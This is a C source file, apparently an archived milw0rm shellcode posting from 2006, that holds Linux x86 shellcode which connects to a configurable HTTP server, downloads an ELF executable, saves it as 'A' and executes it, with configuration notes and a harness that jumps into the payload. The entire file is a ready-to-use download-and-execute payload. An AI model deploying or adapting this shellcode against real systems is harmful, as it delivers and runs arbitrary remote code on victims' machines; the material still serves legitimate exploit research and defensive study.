/*
 * (linux/x86) - HTTP/1.x GET, Downloads and execve() - 111 bytes+
 *
 * This shellcode allows you to download a ELF executable straight off a standard HTTP server
 * and launch it. It will saved locally it into a filename called 'A' in the current directory.
 *
 * <CONFIGURATION>
 *
 * > The destination IP of the HTTP server is required (NO DNS!), use inet_addr() function result and
 *   modify the value in [1*] from 0xdeadbeef to the actual IP, if the IP contains NULLs then a little
 *   workaround requires. The simplest is to use ~inet_addr() followed by ``notl (%esp)`` to change back.
 *
 * > The destination port of the HTTP server is 80 by default, it is located within the 4 upper bytes
 *   of the value in [2*] (0xafff). Stored in an invert format (~), so if any further modification
 *   needed make sure to keep it stored in the same format.
 *
 * > The destination URL should be generated using the ``gen_httpreq`` utility. It will produce an
 *   assembly code which is a series of PUSH's and should be pasted as it is within in the marked place
 *   in the shellcode (look for the comment).
 *
 * <LINKS/UTILITIES>:
 *
 *      gen_httpreq.c, generates a HTTP GET request for this shellcode
 *      > http://www.tty64.org/code/shellcodes/utilities/gen_httpreq.c
 *	backup
 *	> http://www.milw0rm.com/shellcode/2618
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x6a\x66"              // push $0x66
	"\x58"                  // pop %eax
	"\x99"                  // cltd
	"\x6a\x01"              // push $0x1
	"\x5b"                  // pop %ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\x6a\x02"              // push $0x2
	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80"              // int $0x80
	"\x5b"                  // pop %ebx
	"\x5e"                  // pop %esi
	"\x68\xef\xbe\xad\xde"  // [1*] push $0xdeadbeef
	"\xbd\xfd\xff\xff\xaf"  // [2*] mov $0xaffffffd,%ebp
	"\xf7\xd5"              // not %ebp
	"\x55"                  // push %ebp
	"\x43"                  // inc %ebx
	"\x6a\x10"              // push $0x10
	"\x51"                  // push %ecx
	"\x50"                  // push %eax
	"\xb0\x66"              // mov $0x66,%al
	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80"              // int $0x80
	"\x5f"                  // pop %edi
	"\xb0\x08"              // mov $0x8,%al
	"\x52"                  // push %edx
	"\x6a\x41"              // push $0x41
	"\x89\xe3"              // mov %esp,%ebx
	"\x50"                  // push %eax
	"\x59"                  // pop %ecx
	"\xcd\x80"              // int $0x80
	"\x96"                  // xchg %eax,%esi
	"\x87\xdf"              // xchg %ebx,%edi

	//
	// <paste here the code, that gen_httpreq.c outputs!>
	//

	"\xb0\x04"              // mov $0x4,%al

	//
	// <_send_http_request>:
	//

	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80"              // int $0x80
	"\x99"                  // cltd
	"\x42"                  // inc %edx

	//
	// <_wait_for_dbl_crlf>:
	//

	"\x49"                  // dec %ecx
	"\xb0\x03"              // mov $0x3,%al
	"\xcd\x80"              // int $0x80
	"\x81\x39\x0a\x0d\x0a\x0d" // cmpl $0xd0a0d0a,(%ecx)
	"\x75\xf3"              // jne <_wait_for_dbl_crlf>
	"\xb2\x04"              // mov $0x4,%dl

	//
	// <_dump_loop_do_read>:
	//

	"\xb0\x03"              // mov $0x3,%al
	"\xf8"                  // clc


	//
	// <_dump_loop_do_write>:
	//

	"\xcd\x80"              // int $0x80
	"\x87\xde"              // xchg %ebx,%esi
	"\x72\xf7"              // jb <_dump_loop_do_read>
	"\x85\xc0"              // test %eax,%eax
	"\x74\x05"              // je <_close_file>
	"\xb0\x04"              // mov $0x4,%al
	"\xf9"                  // stc
	"\xeb\xf1"              // jmp <_dump_loop_do_write>
	"\xb0\x06"              // mov $0x6,%al
	"\xcd\x80"              // int $0x80
	"\x99"                  // cltd
	"\xb0\x0b"              // mov $0xb,%al
	"\x89\xfb"              // mov %edi,%ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\xeb\xcc";             // jmp <_send_http_request>

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-10-22]